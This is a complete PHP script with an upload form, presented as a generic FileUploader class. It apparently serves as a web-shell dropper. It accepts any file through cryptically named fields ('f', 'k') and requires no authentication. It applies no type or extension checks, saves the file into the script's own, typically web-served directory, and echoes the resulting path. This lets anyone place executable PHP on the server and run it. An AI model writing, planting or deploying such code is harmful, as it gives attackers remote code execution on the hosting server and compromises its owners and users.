<?php

class FileUploader {
    private $destinationFolder;

    public function __construct($destinationFolder = null) {
       
        $this->destinationFolder = $destinationFolder !== null ? $destinationFolder : getcwd();
    }

    public function handleUpload($file, $key) {
        if ($key === 'upload') {
            if ($this->isValidFile($file)) {
                $destination = $this->getDestinationPath($file['name']);
                if ($this->moveUploadedFile($file['tmp_name'], $destination)) {
                    echo "<b>True: {$destination}</b>";
                } else {
                    echo "<b>False</b>";
                }
            } else {
                echo "Error: " . $file['error'];
            }
        }
    }

    private function isValidFile($file) {
        
        return isset($file) && isset($file['error']) && $file['error'] === UPLOAD_ERR_OK;
    }

    private function getDestinationPath($fileName) {
        
        $sanitizedFileName = basename($fileName);
        return rtrim($this->destinationFolder, '/') . '/' . $sanitizedFileName;
    }

    private function moveUploadedFile($tmpName, $destination) {
        
        if (function_exists('move_uploaded_file')) {
            return move_uploaded_file($tmpName, $destination);
        } else {
            
            return rename($tmpName, $destination);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k'])) {
    $uploader = new FileUploader();
    if (isset($_FILES['f'])) {
        $uploader->handleUpload($_FILES['f'], $_POST['k']);
    } else {
        echo "No file uploaded.";
    }
}

?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <input name="k" type="submit" value="upload">
</form>
